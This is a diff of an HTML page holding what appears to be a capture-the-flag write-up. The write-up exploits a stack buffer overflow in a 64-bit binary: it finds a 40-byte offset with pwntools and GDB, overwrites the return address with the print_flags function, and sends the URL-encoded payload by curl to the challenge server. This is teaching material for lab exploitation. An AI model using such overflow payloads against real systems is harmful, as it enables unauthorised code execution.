@@ -125,7 +125,7 @@ $
 <aside aria-label=aside class="w-20-l mt6-l aside-mobile">
 </aside>
 <div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>vulnerable</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom">Arch:     amd64-64-little
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>Arch:     amd64-64-little
 RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
 Stack:    <span class=code-dark-red>No canary found</span>
 NX:       <span class=code-dark-red>NX disabled</span>
@@ -133,19 +133,19 @@ PIE:      <span class=code-dark-red>No PIE (0x400000)</span>
 RWX:      <span class=code-dark-red>Has RWX segments</span>
 </code></pre></div>
 <p>If we execute the binary, it seems that it does nothing:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>./vulnerable</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./vulnerable</span>
 asdf
 fdsa
 1
 2
 </code></pre></div>
 <p>If we insert data from standard input (<code>stdin</code>), we make the program work:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> asdf | <span class=code-dark-green>./vulnerable</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> asdf | <span class=code-dark-green>./vulnerable</span>
 Hello asdf
 !
 </code></pre></div>
 <p>Let&rsquo;s send 100 characters using Python and check if it crashes:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>./vulnerable</span> <<< <span class=code-dark-magenta>$(</span><span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'print("A" * 100)'</span><span class=code-dark-magenta>)</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./vulnerable</span> <<< <span class=code-dark-magenta>$(</span><span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'print("A" * 100)'</span><span class=code-dark-magenta>)</span>
 Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 !
 zsh: segmentation fault (core dumped)
@@ -196,11 +196,11 @@ zsh: segmentation fault (core dumped)
 <p>A Buffer Overflow vulnerability consists of entering enough data to overflow the buffer assigned to a certain variable (in this case, <code>local_28</code>). After the buffer assigned to a variable, there are critical registers that control the execution of the program (such as <code>$rip</code>, <code>$rsp</code> or <code>$rbp</code>). Overflowing the buffer grants us potential control over these registers.</p>
 <p>This time we will focus on controlling <code>$rip</code>, which is the Instruction Pointer register. As its name says, it contains the address of the next instruction to execute. Thus, if we overwrite <code>$rip</code> with the address of <code>print_flags</code>, this function will be executed.</p>
 <p>The address of this function is shown in Ghidra (<code>0x4006ee</code>). However, it can be shown with <code>readelf</code> as well:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s vulnerable | <span class=code-dark-green>grep</span> print_flags
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s vulnerable | <span class=code-dark-green>grep</span> print_flags
     59: 00000000004006ee    34 FUNC    GLOBAL DEFAULT   13 <span class=code-red>print_flags</span>
 </code></pre></div>
 <p>Now we need to have the number of characters needed to reach the <code>$rip</code> register, in order to put there the address of <code>print_flags</code>. This can be done with GDB and a pattern string created with <code>cyclic</code> from <code>pwntools</code> (for example, 100 characters):</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>pwn</span> cyclic 100 | <span class=code-dark-green>tee</span> pattern
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pwn</span> cyclic 100 | <span class=code-dark-green>tee</span> pattern
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
 
 <span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q vulnerable
@@ -214,22 +214,22 @@ Program received signal SIGSEGV, Segmentation fault.
 <span class=code-dark-blue>0x0000000000400771</span> in <span class=code-dark-yellow>main</span> ()
 </code></pre></div>
 <p>Now the program has crashed, we can examine the values of the registers. Since it is a 64-bit binary, <code>$rip</code> is not overwritten (it is kind of protected), so we need to take the value at <code>$rsp</code> (which is the next register after <code>$rip</code>):</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-green>gef➤</span>  x $rsp
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x $rsp
 <span class=code-dark-blue>0x7fffffffe758</span>: 0x6161616b
 </code></pre></div>
 <p>The value <code>0x6161616b</code> corresponds with <code>kaaa</code> (little-endian format). We can calculate the offset again with <code>pwntools</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>pwn</span> cyclic -l 0x6161616b
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pwn</span> cyclic -l 0x6161616b
 40
 </code></pre></div>
 <p>Therefore, we need to enter 40 characters and then the address of <code>print_flags</code> to redirect code execution. Let&rsquo;s do it from the command line. To avoid unexpected behaviour we must set an environment variable called <code>FLAGS</code> (because the binary will try to access it inside <code>print_flags</code>):</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-yellow>export</span> FLAGS=this_will_be_the_flag
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-yellow>export</span> FLAGS=this_will_be_the_flag
 
 <span class=code-cyan>$</span> <span class=code-dark-yellow>(</span><span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'import sys; sys.stdout.write("A" * 40)'</span>; <span class=code-dark-green>echo</span> -e <span class=code-dark-yellow>'\xee\x06\x40\0\0\0\0\0')</span> | <span class=code-dark-green>./vulnerable</span>
 Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@!
 this_will_be_the_flag
 </code></pre></div>
 <p>Nice, now we need to send it to the remote instance. Since the input is taken from an URL query parameter, we need to encode the hexadecimal characters into URL encoding:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>"http://35.227.24.107/0f7bd59245/?stdin=</span><span class=code-dark-magenta>$(</span><span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'import sys; sys.stdout.write("A" * 40)'</span><span class=code-dark-magenta>)</span><span class=code-dark-yellow>%ee%06%40%00%00%00%00%00"</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>"http://35.227.24.107/0f7bd59245/?stdin=</span><span class=code-dark-magenta>$(</span><span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'import sys; sys.stdout.write("A" * 40)'</span><span class=code-dark-magenta>)</span><span class=code-dark-yellow>%ee%06%40%00%00%00%00%00"</span>
 
                 &lt;a href="vulnerable"&gt;Download binary&lt;/a&gt;&lt;br&gt;&lt;br&gt;
                 &lt;form&gt;Stdin: &lt;input type="text" name="stdin"&gt; &lt;input type="submit"&gt;&lt;/form&gt;
